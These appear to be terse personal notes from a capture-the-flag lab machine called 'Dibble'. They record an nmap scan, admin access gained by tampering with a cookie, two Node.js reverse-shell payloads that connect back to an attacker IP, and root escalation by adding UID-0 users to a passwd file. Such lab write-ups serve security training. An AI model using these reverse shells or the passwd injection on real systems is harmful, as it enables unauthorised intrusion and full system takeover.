# Dibble
# date 8/8/2023
# ip 192.168.217.110

javacode execution on port 3000 via nodejs in logs creation > local rev shell > suid cp > modified passwd and added root1 user > switch to root1 

# nmap
22/tcp   open  ssh     syn-ack OpenSSH 8.3 (protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.46 ((Fedora))
3000/tcp open  http    syn-ack Node.js (Express middleware)


# http://192.168.217.110:3000/

auth/register
Let’s create an account for the test and look at the cookie

First url then base64

Type admin and encrypt

First base64 then url

Paste back

Refresh the page

Visit http://192.168.249.110:3000/logs

Create a new log


# exploitation
(function(){
 var net = require(“net”),
 cp = require(“child_process”),
 sh = cp.spawn(“/bin/bash”, []);
 var client = new net.Socket();
 client.connect(21, “192.168.45.188”, function(){
 client.pipe(sh.stdin);
 sh.stdout.pipe(client);
 sh.stderr.pipe(client);
 });
 return /a/;
})();

(function(){
 var net = require("net"),
 cp = require("child_process"),
 sh = cp.spawn("/bin/sh", []);
 var client = new net.Socket();
 client.connect(3000, "192.168.45.188", function(){
 client.pipe(sh.stdin);
 sh.stdout.pipe(client);
 sh.stderr.pipe(client);
 });
 return /a/; // Prevents the Node.js application form crashing
})();

# priv esc
find / -perm -u=s -type f 2>/dev/null
suid



cat /etc/passwd > passwd.bak

openssl passwd pass1234
$1$IxB1VJyW$W4DOYaocpluTPkciv/Htf0

echo root3:$1$IxB1VJyW$W4DOYaocpluTPkciv/Htf0:0:0:root:/root:/bin/bash >> passwd.bak


echo root2:NTOdsvj8zdrXs:0:0:root:/root:/bin/bash >> passwd.back